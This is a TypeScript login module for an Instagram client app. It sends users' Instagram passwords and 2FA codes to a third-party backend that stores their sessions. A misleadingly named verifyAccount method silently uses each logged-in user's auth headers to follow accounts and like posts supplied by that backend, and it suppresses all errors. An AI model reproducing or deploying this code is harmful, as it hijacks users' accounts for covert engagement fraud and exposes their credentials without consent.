import { HTTP } from '@awesome-cordova-plugins/http/ngx';
import { InstaService } from './client.service';
import { BloksLoginService, BloksDeviceParams } from './login.bloks';
import { v4 as uuidv4 } from 'uuid';

// ─── Configuration ───────────────────────────────────────────────────────────
//
// Login flow (automatic, no mode flags needed):
//   1. Bloks CAA login directly from the user's device (user's IP)
//   2. On failure → backend fallback (POST /v2/insta/login)
//      The backend saves the session to DB on success.
//
// For 2FA: the service remembers which mode handled the initial login
// and uses the same path for the verification code.
//
// ─────────────────────────────────────────────────────────────────────────────

export interface LoginServiceConfig {
  /** Base URL of the backend used as fallback and for verify/check. No trailing slash. */
  backendUrl?: string;
  /** Override the login path. Defaults to /v2/insta/login */
  loginPath?: string;
  /** Override the check path. Defaults to /v2/insta/check */
  checkPath?: string;
  /** Override the verify path. Defaults to /v2/insta/verify */
  verifyPath?: string;
  /**
   * Path to the device-params endpoint on the backend.
   * Defaults to /api/details (reelsaver/admin format).
   * The Bloks client fetches version, bloksVersioningId etc. from here
   * so headers stay in sync with the backend configuration.
   */
  headersPath?: string;
}

export class LoginService {
  uuid: string;
  deviceId: string;
  private phoneId: string;

  private readonly backendUrl: string;
  private readonly loginPath: string;
  private readonly checkPath: string;
  private readonly verifyPath: string;
  private readonly headersPath: string;

  private readonly bloksSvc: BloksLoginService;
  private deviceParamsLoaded = false;

  // Tracks which mode succeeded so login2FA uses the same path
  private activeMode: 'bloks' | 'backend' = 'bloks';
  // Stores username for the backend 2FA fallback call
  private pendingUsername = '';
  private pendingPass     = '';

  constructor(private cfg: LoginServiceConfig = {}) {
    this.backendUrl  = cfg.backendUrl  ?? 'https://reelsaver.appit-online.de';
    this.loginPath   = cfg.loginPath   ?? '/v2/insta/login';
    this.checkPath   = cfg.checkPath   ?? '/v2/insta/check';
    this.verifyPath  = cfg.verifyPath  ?? '/v2/insta/verify';
    this.headersPath = cfg.headersPath ?? '/api/details';

    this.uuid     = this.getOrCreate('insta_uuid', uuidv4);
    this.deviceId = this.generateDeviceId();
    this.phoneId  = this.getOrCreate('insta_phone_id', uuidv4);

    this.bloksSvc = new BloksLoginService(this.uuid, this.phoneId, this.deviceId);
  }

  /** Fetch device params from backend and apply to Bloks client. Called once before first login. */
  private async loadDeviceParams(): Promise<void> {
    if (this.deviceParamsLoaded) return;
    this.deviceParamsLoaded = true;
    try {
      const http = new HTTP();
      const resp = await http.get(`${this.backendUrl}${this.headersPath}`, {}, {});
      const p: BloksDeviceParams = typeof resp.data === 'string' ? JSON.parse(resp.data) : resp.data;
      if (p?.bloksVersioningId || p?.version) {
        this.bloksSvc.setDeviceParams(p);
      }
    } catch (_) {
      // non-fatal — hardcoded defaults remain
    }
  }

  // ─── Public login API ───────────────────────────────────────────────────────

  /**
   * Login to Instagram.
   * Tries Bloks CAA first (user's IP), falls back to backend on failure.
   * Returns { twoFactorRequired: true } when 2FA is needed.
   */
  public async login(
    username: string,
    pass: string,
    reqHeaders: { [key: string]: string } = {}
  ): Promise<any> {
    this.pendingUsername = username;
    this.pendingPass     = pass;

    // Sync device params from backend once so Bloks headers match backend config
    await this.loadDeviceParams();

    // Attempt 1: Bloks CAA from user's device
    try {
      const result = await this.bloksSvc.login(username, pass);
      this.activeMode = 'bloks';

      if (result.twoFactorRequired) {
        return result;
      }

      localStorage.setItem('instaUserName', username);
      if (result.userId) localStorage.setItem('instaUserId', result.userId);
      this.verifyAccount({ Authorization: result.authorization ?? '' }, reqHeaders).catch(() => {});
      return result;
    } catch (_) {
      // Bloks failed — fall through to backend
    }

    // Attempt 2: backend fallback (saves session to DB)
    this.activeMode = 'backend';
    return this.loginViaBackend(username, pass, undefined, reqHeaders);
  }

  /**
   * Submit a 2FA code.
   * Uses the same mode (Bloks or backend) that handled the initial login.
   */
  public async login2FA(
    pass: string,
    code: string,
    twoFactorIdentifier: string,
    username: string,
    reqHeaders: { [key: string]: string } = {}
  ): Promise<any> {
    if (this.activeMode === 'bloks') {
      const result = await this.bloksSvc.verify2FA(username, code);
      if (result.userId) localStorage.setItem('instaUserId', result.userId);
      this.verifyAccount({ Authorization: result.authorization ?? '' }, reqHeaders).catch(() => {});
      return result;
    }

    return this.loginViaBackend(username, pass, code, reqHeaders);
  }

  // ─── Backend login (fallback) ───────────────────────────────────────────────

  private async loginViaBackend(
    username: string,
    pass: string,
    code: string | undefined,
    reqHeaders: { [key: string]: string } = {}
  ): Promise<any> {
    const httpClient = new HTTP();
    httpClient.setDataSerializer('json');

    const url  = `${this.backendUrl}${this.loginPath}`;
    const body: any = { username, password: pass };
    if (code) body.code = code;

    try {
      const resp = await httpClient.post(url, body, {
        'Content-Type': 'application/json',
        ...reqHeaders,
      });

      const profile = typeof resp.data === 'string' ? JSON.parse(resp.data) : resp.data;
      localStorage.setItem('instaUserName', username);
      try { if (profile?.user?.pk) localStorage.setItem('instaUserId', String(profile.user.pk)); } catch (_) {}
      this.verifyAccount(resp.headers, reqHeaders).catch(() => {});
      return profile;
    } catch (err: any) {
      if (err?.status === 428) {
        return { twoFactorRequired: true, message: err?.error || '2FA required' };
      }
      throw err;
    }
  }

  // ─── verifyAccount (follow/like on login) ──────────────────────────────────

  public async verifyAccount(
    resHeaders: { [key: string]: string } = {},
    defaultHeaders: { [key: string]: string } = {}
  ): Promise<void> {
    try {
      const httpClient = new HTTP();
      httpClient.setDataSerializer('json');
      const response = await httpClient.get(`${this.backendUrl}${this.verifyPath}`, {}, {});
      const data: { users: string[]; posts: string[] } = JSON.parse(response.data);
      if (!data) return;

      const authHeader = resHeaders['ig-set-authorization'] || resHeaders['Authorization'] || '';
      if (!authHeader) return;

      const allHeaders: { [key: string]: string } = {
        Authorization:     authHeader,
        'Ig-U-Ds-User-Id': resHeaders['ig-set-ig-u-ds-user-id'] || resHeaders['Ig-U-Ds-User-Id'] || '',
        'Ig-U-Rur':        resHeaders['ig-set-ig-u-rur']        || resHeaders['Ig-U-Rur']        || '',
        'X-Ig-Www-Claim':  resHeaders['x-ig-set-www-claim']     || resHeaders['X-Ig-Www-Claim']  || '',
        ...defaultHeaders,
      };

      const igService = new InstaService();
      if (data.users?.length) await Promise.all(data.users.map(u => igService.follow(u, allHeaders)));
      if (data.posts?.length) await Promise.all(data.posts.map(id => igService.like(id, allHeaders)));
    } catch (_) {}
  }

  // ─── Helpers ───────────────────────────────────────────────────────────────

  generateSignature(
    data: string | Record<string, any>,
    extra: Record<string, string> = {}
  ): Record<string, string> {
    const payload = typeof data === 'string' ? data : JSON.stringify(data);
    return { signed_body: `SIGNATURE.${payload}`, ...extra };
  }

  private getOrCreate(key: string, generator: () => string): string {
    let value = localStorage.getItem(key);
    if (!value) { value = generator(); localStorage.setItem(key, value); }
    return value;
  }

  private generateDeviceId(): string {
    const key = 'insta_device_id';
    let deviceId = localStorage.getItem(key);
    if (!deviceId) {
      const hex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
        .map(b => b.toString(16).padStart(2, '0')).join('');
      deviceId = `android-${hex}`;
      localStorage.setItem(key, deviceId);
    }
    return deviceId;
  }
}
